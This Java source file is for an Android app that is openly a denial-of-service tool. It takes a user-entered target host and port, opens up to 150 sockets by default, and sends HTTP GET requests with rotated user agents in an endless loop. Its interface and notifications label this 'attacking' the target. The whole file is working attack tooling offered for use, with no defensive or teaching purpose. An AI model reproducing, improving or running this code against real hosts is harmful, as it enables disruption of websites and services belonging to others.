package com.st3lr.doss3r;

import android.annotation.SuppressLint;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Context;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ScrollView;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.NotificationCompat;

import com.application.isradeleon.notify.Notify;
import com.dx.dxloadingbutton.lib.LoadingButton;

import java.io.IOException;
import java.io.OutputStream;
import java.net.Proxy;
import java.net.Socket;
import java.net.UnknownHostException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Random;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;


public class MainActivity extends AppCompatActivity {
    private List<Socket> socketList = new ArrayList<>();
    private static final String TAG = "MainActivity";
    private EditText editTextTarget;
    private boolean loadingsockets = false;
    LoadingButton lb;
    private LoadingButton buttonStart;
    private  int counter =0;
    private int notificationId = 1001;
    private TextView textViewLog;
    private ExecutorService executorService;
    private final int proxyTimeoutSeconds = 5;
    private final int sleepSeconds = 15;
    private  final int numSockets = 150;
    public int port =  80;
    private static final int NOTIFICATION_ID = 1;
    public  String notifmsg = "the attack is connecting sockets";
    boolean iswork = false;
    NotificationChannel channel;
    private final String[] userAgents = {
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/80.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64) Chrome/80.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) Safari/604.1"
    };


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Window window = null;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            window = getWindow();
        }

        window.addFlags(WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS);
        ((Window) window).setStatusBarColor(Color.parseColor("#44EB02"));
        editTextTarget = findViewById(R.id.domainInput);
        buttonStart = findViewById(R.id.startButton);
        textViewLog = findViewById(R.id.borderBox);
        buttonStart.setBackgroundColor(R.drawable.button_with_lime_border);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel( getString(R.string.notify_channel_id), getString(R.string.notify_channel_name), NotificationManager.IMPORTANCE_LOW ); channel.setDescription(getString(R.string.notify_channel_description)); NotificationManager notificationManager = getSystemService(NotificationManager.class);
            if (notificationManager != null) { notificationManager.createNotificationChannel(channel); }}
        Timer timer = new Timer();
        lb = (LoadingButton)findViewById(R.id.startButton);

         buttonStart.setOnClickListener(new View.OnClickListener() {
            @SuppressLint("StaticFieldLeak")
            @Override
            public void onClick(View v) {
                if (!iswork){
                    iswork = true;
System.out.println("work is true");
                    lb.startLoading();
                }else{
                    System.out.println("work is false");
                    executorService.shutdown();
                    textViewLog.clearComposingText();
                    try {
                        System.out.println("closing sockets");
                        for (Socket socket : socketList) {
                            socket.close();
                        }
                    } catch (IOException e) {
                        logMessage("Failed to close socket: " + e.getMessage());
                    }
                    socketList.clear();
                    textViewLog.setText("");

                    buttonStart.setText("Start");
                    loadingsockets = true;
                    iswork = false;
                    try {
                        Thread.sleep(2000);
                    } catch (InterruptedException e) {
                        throw new RuntimeException(e);
                    }

                    logMessage("Attack stopped");
                    notifNow("Attack stopped");
                    lb.loadingSuccessful();
                    try {
                        Thread.sleep(2000);
                    } catch (InterruptedException e) {
                        throw new RuntimeException(e);
                    }

                    return;
                }

                String target = editTextTarget.getText().toString();
                buttonStart.setText("Attacking");
              //  buttonStart.setBackgroundColor(R.drawable.green_border);
                if (!target.isEmpty()) {

                    new AsyncTask<Void, Void, Void>() {
                        @Override
                        protected Void doInBackground(Void... voids) {
                            try {
                                startNetworkOperation(target); // Call your network operation method
                            } catch (IOException e) {
                                logMessage("Network operation failed: " + e.getMessage());
                            }
                            return null;
                        }

                        @Override
                        protected void onPostExecute(Void aVoid) {
                            super.onPostExecute(aVoid);
                        }

                    }.execute();
                } else {
                    logMessage("Please enter a target.");
                }
            }
        });
        TimerTask task = new TimerTask() {
            @Override
            public void run() {

notifNow(notifmsg);
            }
        };
        timer.schedule(task, 0, 1000);
    }

    private void notifNow(String message) {
        NotificationManager notificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel("your_channel_id",
                    "Channel Name",
                    NotificationManager.IMPORTANCE_LOW);
            notificationManager.createNotificationChannel(channel);
        }

        NotificationCompat.Builder builder = new NotificationCompat.Builder(getApplicationContext(), "your_channel_id")
                .setSmallIcon(R.drawable.logoimgg)
                .setColor(getResources().getColor(R.color.black))
                .setLargeIcon(BitmapFactory.decodeResource(getResources(), R.drawable.troll))
                .setContentTitle("Progress Report")
                .setContentText(message)
                .setStyle(new NotificationCompat.BigPictureStyle()
                        .bigPicture(BitmapFactory.decodeResource(getResources(), R.drawable.ddos)))
                .setPriority(NotificationCompat.PRIORITY_LOW);


        notificationManager.notify(NOTIFICATION_ID, builder.build());
    }
    private void startNetworkOperation(String target) throws IOException {
        executorService = Executors.newFixedThreadPool(numSockets);
        socketList = new ArrayList<>(numSockets); // Initialize the socket list
        final List<Socket>[] connectedSockets = new List[]{new ArrayList<>()};
        TextView nums = findViewById(R.id.socketcount);
        TextView portholder = findViewById(R.id.port);
        String ports = portholder.getText().toString();
        int portnum;
        if (ports.isEmpty()) {
            portnum = port;
            logMessage("Port not set , switching to default value  °80");
            port = 80;

        } else {
            logMessage("Port set to " + port);
            portnum = Integer.parseInt(ports);
        }


        int sck = 0;
        if (nums.getText().toString().isEmpty()) {
            logMessage("numbers of sockets not set , switching to default value  °150");
             //sck = Integer.parseInt(nums.getText().toString());
            sck = 150;

        }
        else {
             sck = Integer.parseInt(nums.getText().toString());
        }


logMessage("sockets numbers set to " + sck);

        for (int i = 0; i < sck; i++) {
            try {
                if (!loadingsockets){

                    Socket socket = new Socket(target, portnum);
                    socketList.add(socket);
                    connectedSockets[0].add(socket);
                    notifmsg = "connected socket #" + i;
                    logMessage("Socket #" + i + " connected");
                }else{
                    loadingsockets = false;
                    logMessage("Attack stopped");
                    notifNow("Attack stopped");
                    return;
                }

            } catch (IOException e) {
                logMessage("Failed to connect socket #" + i + ": " + e.getMessage());
            }
        }




            executorService.submit(() -> {
                while (!executorService.isShutdown()) {
                    for (int i = 0; i < connectedSockets[0].size(); i++) {
                        final Socket sc = connectedSockets[0].get(i);
                        final int socketIndex = i;
                        try {
counter++;

                            String userAgent = userAgents[new Random().nextInt(userAgents.length)];
                            String headers = "GET / HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\n\r\n";
                            OutputStream outputStream = sc.getOutputStream();
                            outputStream.write(headers.getBytes());
                            outputStream.flush();
                            SimpleDateFormat sdf = new SimpleDateFormat("''dd-MM-yyyy ''HH:mm:ss z");

notifmsg ="attacking " + target  +" "+ counter + " times";
                            String currentDateAndTime = sdf.format(new Date());
                            logMessage("Sent request " + counter + "to "+ target + "in " + currentDateAndTime);



                        } catch (UnknownHostException e) {
                            logMessage("Unknown Host for socket #" + socketIndex + ": " + e.getMessage());
                            try {
                                connectedSockets[socketIndex] = (List<Socket>) new Socket(target, portnum);
                                logMessage("Connecting to " + socketIndex);
                            } catch (IOException ex) {
                                throw new RuntimeException(ex);
                            }
                        } catch (IOException e) {
                            logMessage("IOException for socket #" + socketIndex + ": " + e.getMessage());
                            try {
                                connectedSockets[socketIndex] = (List<Socket>) new Socket(target, portnum);
                                logMessage("Socket #" + socketIndex + " connected   ");
                            } catch (IOException ex) {
                                throw new RuntimeException(ex);
                            }
                        } catch (Exception e){
                            logMessage("Exception for socket #" + socketIndex + ": " + e.getMessage());
                            try {
                                connectedSockets[socketIndex] = (List<Socket>) new Socket(target, portnum);
                                logMessage("Socket #" + socketIndex + "reconnected");
                            } catch (IOException ex) {
                                throw new RuntimeException(ex);
                            }
                        }


                    }
                    logMessage("sleeping for 15 seconds");
                    logMessage("==============================================");
                    try {
                        Thread.sleep(sleepSeconds * 1000);
                    } catch (InterruptedException e) {
                        throw new RuntimeException(e);
                    }
                }
            });


       
        logMessage("completed test");
       
    }


    private static boolean isNumeric(String str) {
        try {
            Double.parseDouble(str);
            return true;
        } catch(NumberFormatException e){
            return false;
        }
    }
    private void logMessage(String message) {
        runOnUiThread(() -> {

            textViewLog.append(message + "\n");
System.out.println(message);

            ScrollView scrollView = findViewById(R.id.scrv);
            scrollView.post(() -> {
                scrollView.fullScroll(View.FOCUS_DOWN);
            });
        });
    }
}
